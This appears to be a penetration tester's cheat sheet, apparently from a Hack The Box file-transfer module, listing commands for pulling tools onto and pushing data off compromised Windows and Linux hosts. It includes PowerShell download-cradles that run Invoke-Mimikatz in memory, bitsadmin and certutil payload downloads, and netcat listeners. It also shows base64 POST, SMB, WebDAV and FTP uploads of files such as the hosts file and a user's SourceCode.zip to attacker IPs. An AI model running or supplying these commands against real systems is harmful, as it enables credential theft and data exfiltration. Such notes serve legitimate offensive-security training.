## Download Powershell/bitsadmin/wget/php/scp

|**Command**|**Description**|
|---|---|
|`Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1`|Download a file with PowerShell|
|`IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`|Execute a file in memory using PowerShell|
|`Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64`|Upload a file with PowerShell|
|`bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe`|Download a file using Bitsadmin|
|`certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`|Download a file using Certutil|
|`wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`|Download a file using Wget|
|`curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`|Download a file using cURL|
|`php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`|Download a file using PHP|
|`scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip`|Upload a file using SCP|
|`scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe`|Download a file using SCP|
|`Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"`|Invoke-WebRequest using a Chrome User Agent|


## Download SMB

```shell-session
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

```cmd-session
copy \\192.168.220.133\share\nc.exe
```

Authorized smb server creation
```shell-session
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```


mout share:
```cmd-session
net use n: \\192.168.220.133\share /user:test test
```

## Donwload FTP

Install
```shell-session
sudo pip3 install pyftpdlib
```

```shell-session
sudo python3 -m pyftpdlib --port 21
```

PowerShell Download
```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://10.10.14.149/upload_win.zip', 'C:\Users\Public\ftp-file.txt')
```

## Upload file with PowerShell
```shell-session
pip3 install uploadserver
```
```shell-session
python3 -m uploadserver
```
```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```


## Upload PowerShell and Netcat
On RHOST:

```powershell-session
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path "C:\Tools\20231222055409_ILFREIGHT.zip" -Encoding Byte))

PS C:\htb> Invoke-WebRequest -Uri http://10.10.14.186:8000/ -Method POST -Body $b64
```
On LHOST:
```shell-session
nc -lvnp 8000
```
```shell-session
Tachipy@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts
```

## Upload SMB Over HTTP:

```shell-session
Tachipy@htb[/htb]$ sudo pip install wsgidav cheroot
```
```shell-session
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```
```cmd-session
dir \\192.168.49.128\DavWWWRoot
```
```cmd-session
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

## Upload FTP

LHOST
```shell-session
sudo python3 -m pyftpdlib --port 21 --write
```
RHOST
```powershell-session
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
